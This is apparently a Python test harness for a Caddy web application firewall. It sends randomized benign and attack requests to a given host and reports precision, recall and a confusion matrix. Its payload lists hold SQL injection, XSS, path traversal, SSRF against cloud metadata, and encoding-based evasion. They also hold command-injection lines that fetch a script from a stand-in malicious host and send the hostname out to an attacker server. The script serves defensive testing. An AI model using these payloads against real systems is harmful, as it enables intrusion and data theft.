import requests
import argparse
from termcolor import colored
from collections import Counter
import random
from urllib.parse import quote

# --- Configuration ---
MAX_PAYLOAD_LENGTH = 2048
COMMON_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
]
EVASION_TECHNIQUES = [
    lambda x: x,  # No encoding
    quote,  # URL encoding
    lambda x: "".join([f"%{ord(c):02x}" for c in x]), # URL hex encoding
    lambda x: x.replace("<", "<").replace(">", ">"), # HTML encoding
    lambda x: x.replace("'", "\\'").replace('"', '\\"'), # Backslash escaping
]

# --- Helper Functions ---
def random_choice(items):
    return random.choice(items)

def random_string(length=10):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length))

def generate_long_string(length=3000):
    return "A" * length

def generate_random_headers():
    headers = {}
    if random.random() < 0.3:
        headers["X-Custom-Header"] = random_string(20)
    if random.random() < 0.2:
        headers["Referer"] = f"http://{random_string(10)}.com"
    return headers

# --- Payload Generators ---
def generate_sql_injection_payload(level):
    base_payloads = [
        "1' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT null, version() --",
        "\" OR 1=1 -- -",
        "admin'--",
        "1' OR SLEEP(5) --",
    ]
    advanced_payloads = [
        "'; EXEC xp_cmdshell('net user')--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+",
        "' UNION ALL SELECT @@version,null,null--",
        "'; DECLARE @p varchar(255);SET @p=(char(99)+char(109)+char(100));EXEC(@p) --",
    ]
    if level <= 6:
        return random_choice(base_payloads)
    else:
        return random_choice(advanced_payloads)

def generate_xss_payload(level):
    base_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<a href=\"javascript:alert('XSS')\">Click Me</a>",
        "<svg onload=alert('XSS')>",
        "<h1>Hello</h1>" # Benign, for negative testing
    ]
    advanced_payloads = [
        "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
        "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
        "<body onload=alert('XSS')>",
        "<input type='image' src='#' onerror='alert(\"XSS\")'>",
    ]
    if level <= 7:
        return random_choice(base_payloads)
    else:
        return random_choice(advanced_payloads)

def generate_command_injection_payload(level):
    base_payloads = [
        "| whoami",
        "; ls -l",
        "& ipconfig",
        "`pwd`",
        "$(id)",
    ]
    advanced_payloads = [
        "; cat /etc/passwd",
        "&& ping -c 3 google.com",
        "| wget http://malicious.com/evil.sh -O /tmp/evil.sh",
        "; curl http://your-server.com/?data=$(hostname)",
    ]
    if level <= 8:
        return random_choice(base_payloads)
    else:
        return random_choice(advanced_payloads)

def generate_path_traversal_payload(level):
    base_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd", # Absolute path
        "folder/../../etc/passwd", # Obfuscation
    ]
    advanced_payloads = [
        "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL encoded
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini", # Another encoding
        ".../...//etc//passwd", # Mixed slashes
        "..///////etc///////passwd", # Multiple slashes
    ]
    if level <= 7:
        return random_choice(base_payloads)
    else:
        return random_choice(advanced_payloads)

def generate_ssrf_payload(level):
    base_payloads = [
        "http://localhost",
        "http://127.0.0.1",
        "http://example.com",
        "file:///etc/passwd",
    ]
    advanced_payloads = [
        "http://[::1]",  # IPv6 localhost
        "http://0.0.0.0", # All interfaces
        "http://169.254.169.254/latest/meta-data/", # AWS metadata
        "http://your-internal-server/",
    ]
    if level <= 8:
        return random_choice(base_payloads)
    else:
        return random_choice(advanced_payloads)

def generate_http_methods():
    return random_choice(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "HEAD"])

def generate_large_payload():
    payload_type = random_choice(["param", "header", "body"])
    size = random.randint(1024, MAX_PAYLOAD_LENGTH)
    long_string = generate_long_string(size)
    if payload_type == "param":
        return f"?longparam={long_string}", None, None
    elif payload_type == "header":
        return None, {"X-Large-Header": long_string}, None
    else:
        return None, None, long_string

def generate_uncommon_headers():
    headers = {}
    if random.random() < 0.5:
        headers["X-Forwarded-For"] = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    if random.random() < 0.3:
        headers["X-Real-IP"] = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    if random.random() < 0.2:
        headers["Origin"] = f"http://{random_string(8)}.com"
    return headers

# Parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="Enhanced Caddy WAF Testing Script with Metrics")
    parser.add_argument(
        "--host", required=True, help="The host URL of the WAF (e.g., http://localhost:8080)"
    )
    parser.add_argument(
        "--num-tests", type=int, required=True, help="Total number of test cases to generate"
    )
    return parser.parse_args()

def generate_payload(level):
    method = "GET"
    payload = "/"
    headers = {}
    data = None
    expected_status = 200
    is_malicious = False

    test_type = random.choices(
        [
            "benign", "suspicious_headers", "sql_injection_get", "sql_injection_post",
            "xss_get", "xss_post", "command_injection", "path_traversal", "ssrf",
            "long_request", "uncommon_headers", "http_methods"
        ],
        weights=[
            2, 1, 1, 1, 1, 1, 0.8, 0.8, 0.5, 0.5, 0.7, 0.6
        ],
        k=1,
    )[0]

    if test_type == "benign":
        if level <= 3:
            method = "GET"
            payload = f"/{random_string(5)}"
            expected_status = 200
    elif test_type == "suspicious_headers":
        if level >= 3:
            method = "GET"
            payload = f"/search?q={random_string(10)}"
            headers = {"X-Suspicious": f"<script>alert('{random_string(5)}')</script>", "User-Agent": random_choice(["badbot/1.0", "curl/7."])}
            expected_status = 403
            is_malicious = True
    elif test_type == "sql_injection_get":
        if level >= 5:
            method = "GET"
            payload = f"/search?id={generate_sql_injection_payload(level)}"
            expected_status = 403
            is_malicious = True
    elif test_type == "sql_injection_post":
        if level >= 6:
            method = "POST"
            payload = "/submit"
            data = {"input": generate_sql_injection_payload(level)}
            expected_status = 403
            is_malicious = True
    elif test_type == "xss_get":
        if level >= 7:
            method = "GET"
            payload = f"/search?query={generate_xss_payload(level)}"
            expected_status = 403
            is_malicious = True
    elif test_type == "xss_post":
        if level >= 8:
            method = "POST"
            payload = "/comment"
            data = {"text": generate_xss_payload(level)}
            expected_status = 403
            is_malicious = True
    elif test_type == "command_injection":
        if level >= 8:
            method = "GET"
            payload = f"/execute?cmd={generate_command_injection_payload(level)}"
            expected_status = 403
            is_malicious = True
    elif test_type == "path_traversal":
        if level >= 7:
            method = "GET"
            payload = f"/download?file={generate_path_traversal_payload(level)}"
            expected_status = 403
            is_malicious = True
    elif test_type == "ssrf":
        if level >= 8:
            method = "GET"
            payload = f"/proxy?url={generate_ssrf_payload(level)}"
            expected_status = 403
            is_malicious = True
    elif test_type == "long_request":
        method = random_choice(["GET", "POST"])
        payload, header_payload, body_payload = generate_large_payload()
        if payload:
            payload = f"/{random_string(5)}{payload}"
        if header_payload:
            headers.update(header_payload)
        if body_payload:
            data = body_payload
        expected_status = 500 if len(str(data) if data else str(headers)) > MAX_PAYLOAD_LENGTH else 200
        is_malicious = len(str(data) if data else str(headers)) > MAX_PAYLOAD_LENGTH
    elif test_type == "uncommon_headers":
        method = "GET"
        payload = f"/{random_string(5)}"
        headers.update(generate_uncommon_headers())
        expected_status = 200 # Could be more nuanced based on WAF rules
    elif test_type == "http_methods":
        method = generate_http_methods()
        payload = f"/{random_string(5)}"
        expected_status = 200 # Adapt based on expected behavior for different methods

    # Apply random encoding for evasion
    if is_malicious and random.random() < 0.3:
        evasion = random_choice(EVASION_TECHNIQUES)
        payload = evasion(payload)
        if data and isinstance(data, dict):
            for key, value in data.items():
                data[key] = evasion(value)
        elif data and isinstance(data, str):
            data = evasion(data)

    return method, payload, headers, data, expected_status, is_malicious

# Generate test cases with flexible distribution
def generate_test_cases(num_tests):
    test_cases = []
    # Define a broader range of levels and their descriptions
    levels = {
        1: "Benign Requests",
        2: "Slightly Unusual Requests",
        3: "Suspicious Headers/User-Agents",
        4: "Basic Probing for Vulnerabilities",
        5: "Simple SQL Injection Attempts (GET)",
        6: "Simple SQL Injection Attempts (POST)",
        7: "Basic XSS and Path Traversal",
        8: "Command Injection and SSRF",
        9: "Advanced/Obfuscated Attacks",
        10: "Edge Cases and Resource Exhaustion",
    }
    tests_per_level = num_tests // len(levels)
    extra_tests = num_tests % len(levels)

    for level_num in levels:
        additional_test = 1 if level_num <= extra_tests else 0
        for _ in range(tests_per_level + additional_test):
            method, payload, headers, data, expected_status, is_malicious = generate_payload(level_num)
            test_cases.append({
                "level": level_num,
                "method": method,
                "payload": payload,
                "headers": headers,
                "data": data,
                "expected_status": expected_status,
                "is_malicious": is_malicious,
            })
    return test_cases

# Execute test cases
def execute_tests(host, test_cases):
    results = []
    for i, test in enumerate(test_cases):
        try:
            response = requests.request(
                method=test["method"],
                url=f"{host}{test['payload']}",
                headers=test["headers"],
                data=test["data"],
                timeout=10,  # Increased timeout
                allow_redirects=False # Prevent following redirects for accurate status codes
            )
            actual_status = response.status_code
            is_correct = (actual_status == test["expected_status"])
            results.append({
                "test_id": i + 1,
                "level": test["level"],
                "method": test["method"],
                "payload": test["payload"],
                "headers": test["headers"],
                "data": test["data"],
                "expected_status": test["expected_status"],
                "actual_status": actual_status,
                "is_correct": is_correct,
                "is_malicious": test["is_malicious"],
            })
        except requests.exceptions.RequestException as e:
            results.append({
                "test_id": i + 1,
                "level": test["level"],
                "method": test["method"],
                "payload": test["payload"],
                "headers": test["headers"],
                "data": test["data"],
                "expected_status": test["expected_status"],
                "actual_status": f"Error: {str(e)}",
                "is_correct": False,
                "is_malicious": test["is_malicious"],
            })
    return results

# Display results with colors and metrics
def display_results(results):
    confusion_matrix = Counter({"TP": 0, "FP": 0, "TN": 0, "FN": 0})

    print("\nDetailed Test Results:\n" + "-" * 80)
    for result in results:
        level = result["level"]
        method = result["method"]
        payload = result["payload"]
        expected = result["expected_status"]
        actual = result["actual_status"]
        is_correct = result["is_correct"]
        is_malicious = result["is_malicious"]

        # Update confusion matrix
        if is_malicious and is_correct:
            confusion_matrix["TP"] += 1
        elif not is_malicious and not is_correct:
            confusion_matrix["FP"] += 1
        elif not is_malicious and is_correct:
            confusion_matrix["TN"] += 1
        elif is_malicious and not is_correct:
            confusion_matrix["FN"] += 1

        # Color-coded output
        color = "green" if is_correct else "red"
        print(colored(
            f"Test {result['test_id']} | Level {level} | {method} {payload} -> Expected: {expected}, Actual: {actual} (Correct: {is_correct})",
            color,
        ))
        if not is_correct:
            print(colored(f"   Headers: {result['headers']}", "yellow"))
            if result['data']:
                print(colored(f"   Data: {result['data']}", "yellow"))

    # Calculate metrics
    tp, fp, tn, fn = confusion_matrix["TP"], confusion_matrix["FP"], confusion_matrix["TN"], confusion_matrix["FN"]
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    accuracy = (tp + tn) / (tp + fp + tn + fn) if (tp + fp + tn + fn) > 0 else 0

    # Display final metrics
    print("\n" + "=" * 80)
    print("Final Statistics:")
    print(f"  Total Tests: {len(results)}")
    print(f"  Accuracy: {accuracy * 100:.2f}%")
    print(f"  Precision: {precision * 100:.2f}%")
    print(f"  Recall: {recall * 100:.2f}%")
    print(f"  F1 Score: {f1_score * 100:.2f}%")
    print("-" * 80)
    print("Confusion Matrix:")
    print(f"  True Positives (TP): {tp}")
    print(f"  False Positives (FP): {fp}")
    print(f"  True Negatives (TN): {tn}")
    print(f"  False Negatives (FN): {fn}")
    print("=" * 80)

# Main execution
if __name__ == "__main__":
    args = parse_args()
    test_cases = generate_test_cases(args.num_tests)
    results = execute_tests(args.host, test_cases)
    display_results(results)
